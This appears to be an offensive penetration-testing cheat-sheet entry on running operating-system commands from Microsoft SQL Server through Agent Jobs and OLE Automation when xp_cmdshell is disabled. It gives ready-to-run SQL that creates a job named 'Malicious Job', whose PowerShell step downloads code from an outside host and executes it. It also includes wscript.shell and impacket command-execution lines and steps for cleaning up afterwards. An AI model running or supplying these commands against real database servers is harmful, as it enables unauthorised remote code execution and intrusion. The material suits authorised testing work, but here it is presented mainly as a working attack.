# 17.05 MSSQL Command Execution Agent Job OLE Automation

> Pop commands via MSSQL Agent Jobs (PowerShell/CmdExec subsystems) or OLE Automation (`sp_OACreate` + `wscript.shell`) when xp_cmdshell is gone.

## Overview

Beyond xp_cmdshell, MSSQL Server offers two additional command execution paths: MSSQL Server Agent Jobs (using PowerShell, CmdExec, or other subsystems) and OLE Automation stored procedures (using wscript.shell via sp_OACreate/sp_OAMethod). Both require sysadmin.

## Steps

- Enable OLE Automation with sp_configure 'ole automation procedures', 1 then RECONFIGURE
- Create a malicious Agent Job using sp_add_job, sp_add_jobstep (PowerShell subsystem), sp_add_jobserver, sp_start_job
- Use CmdExec subsystem (as impacket sp_start_job does internally) for direct command execution
- Use sp_OACreate 'wscript.shell' + sp_OAMethod 'run' to execute commands via OLE
- Clean up Agent Jobs with sp_delete_job; disable OLE and advanced options when done
- impacket sp_start_job command blindly executes via CmdExec subsystem with delete_level=3

## Commands

### Enable OLE Automation

```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'ole automation procedures', 1; RECONFIGURE;
```

### Agent Job — PowerShell reverse shell

```sql
USE msdb; GO EXEC sp_add_job @job_name = N'Malicious Job'; GO EXEC sp_add_jobstep @job_name = N'Malicious Job', @step_name = N'Execute PowerShell Script', @subsystem = N'PowerShell', @command = N'(New-Object Net.WebClient).DownloadString("http://10.10.14.104/a")|IEX;', @retry_attempts = 5, @retry_interval = 5; GO EXEC sp_add_jobserver @job_name = N'Malicious Job'; GO EXEC sp_start_job @job_name = N'Malicious Job'; GO
```

### OLE Automation command execution

```sql
DECLARE @objShell INT; DECLARE @output varchar(8000); EXEC @output = sp_OACreate 'wscript.shell', @objShell Output; EXEC sp_OAMethod @objShell, 'run', NULL, 'cmd.exe /c "whoami > C:\Windows\Tasks\tmp.txt"';
```

### impacket sp_start_job

```text
SQL (sa  dbo@master)> sp_start_job cmd.exe /c "whoami > C:\Windows\Tasks\tmp.txt"
```
